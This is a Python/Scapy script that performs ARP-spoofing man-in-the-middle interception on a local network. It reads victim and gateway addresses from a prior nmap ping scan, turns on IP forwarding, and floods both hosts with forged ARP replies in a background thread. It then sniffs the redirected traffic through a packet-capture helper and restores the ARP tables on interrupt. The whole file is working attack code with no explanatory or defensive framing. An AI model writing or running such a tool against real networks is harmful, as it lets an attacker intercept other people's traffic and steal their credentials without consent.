from scapy.all import *
import sys
import os
import time
import sniff as capture
import threading

interface = sys.argv[1]


os.system("python nmap_ping.py " + interface)

with open('result_ping.txt', 'r') as myfile:
    victimsLines = myfile.readlines()

    for victimLine in victimsLines:
        victim_ip = victimLine.split(' -- ')[0]
        victim_mac = victimLine.split(' -- ')[1]
        #print (victim_mac)
with open('result_ping.txt', 'r') as file:

    list = file.readlines()
    router_specs = ".1 --"
    list_router = [ip_mac for ip_mac in list if router_specs in ip_mac]

for router in list_router:
    router_ip = router.split(" -- ")[0]
    router_mac = router.split(" -- ")[1]

    print (router_ip)
    print (router_mac)

print ("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def reARP():

        print ("\n[*] Restoring Targets...")


        send(ARP(op = 2, pdst = router_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
        send(ARP(op = 2, pdst = victim_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = router_mac), count = 7)
        print ("[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("[*] Shutting Down...")
        sys.exit(1)



def trick(gm, vm):
    while 1:
        conf.verb = 0
        send(ARP(op = 2, pdst = victim_ip, psrc = router_ip, hwdst= vm))
        send(ARP(op = 2, pdst = router_ip, psrc = victim_ip, hwdst= gm))


def mitm():
        try:
                victim_mac
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print ("[!] Couldn't Find Victim MAC Address")
                print ("[!] Exiting...")
                sys.exit(1)
        try:
                router_mac
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print ("[!] Couldn't Find Gateway MAC Address")
                print ("[!] Exiting...")
                sys.exit(1)
        print ("[*] Poisoning Targets...")

        poison_thread = threading.Thread(target=trick, args=(router_mac, victim_mac))
        poison_thread.start()
        try:                        #trick(router_mac, victim_mac)

            time.sleep(1.5)
            #sniff(prn=get_url.process_tcp_packet)
            sniff(iface=interface, prn=capture.check_pkt, store=0)
            #sniff(iface=interface, prn=captures.processPacket, store=0)

        except KeyboardInterrupt:
            reARP()
mitm()
